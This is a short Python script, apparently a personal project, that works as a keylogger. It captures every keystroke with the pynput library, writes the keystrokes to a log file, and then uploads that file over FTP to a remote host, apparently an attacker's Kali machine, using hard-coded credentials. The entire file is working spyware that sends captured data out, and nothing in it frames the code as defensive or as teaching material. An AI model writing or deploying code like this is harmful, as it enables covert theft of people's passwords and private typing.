# -*- coding: utf-8 -*-
"""
Created on Wed Mar 17 22:15:57 2021

@author: Dhiral
"""

from pynput.keyboard import Key, Listener
import ftplib
import logging

logdir = ""

logging.basicConfig(filename=(logdir+"klog-res.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s")

def pressing_key(Key):
    try:
        logging.info(str(Key))
    except AttributeError:
        print("A special key {0} has been pressed. ".format(Key))
        
def releasing_key(Key):
    try:
        if Key==Key.esc:
            return False
    except :
        return
    
print("\nStarted Listening....\n")

with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
    listener.join()
    
print("\nConnecting to the FTP and sending the data....")

sess = ftplib.FTP("172.24.126.182","kali","kali")
file = open("klog-res.txt","rb")
sess.storbinary("STOR klog-res.txt", file)
file.close()
sess.quit()
